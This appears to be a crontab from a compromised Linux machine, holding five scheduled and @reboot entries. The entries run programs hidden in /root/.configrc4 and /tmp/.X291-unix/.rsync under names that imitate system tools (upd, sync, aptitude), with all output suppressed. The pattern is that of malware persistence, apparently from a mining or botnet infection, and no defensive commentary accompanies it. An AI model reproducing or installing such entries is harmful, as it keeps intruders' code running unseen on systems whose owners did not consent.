1 1 */2 * * /root/.configrc4/a/upd>/dev/null 2>&1
@reboot /root/.configrc4/a/upd>/dev/null 2>&1
5 8 * * 0 /root/.configrc4/b/sync>/dev/null 2>&1
@reboot /root/.configrc4/b/sync>/dev/null 2>&1
0 0 */3 * * /tmp/.X291-unix/.rsync/c/aptitude>/dev/null 2>&1
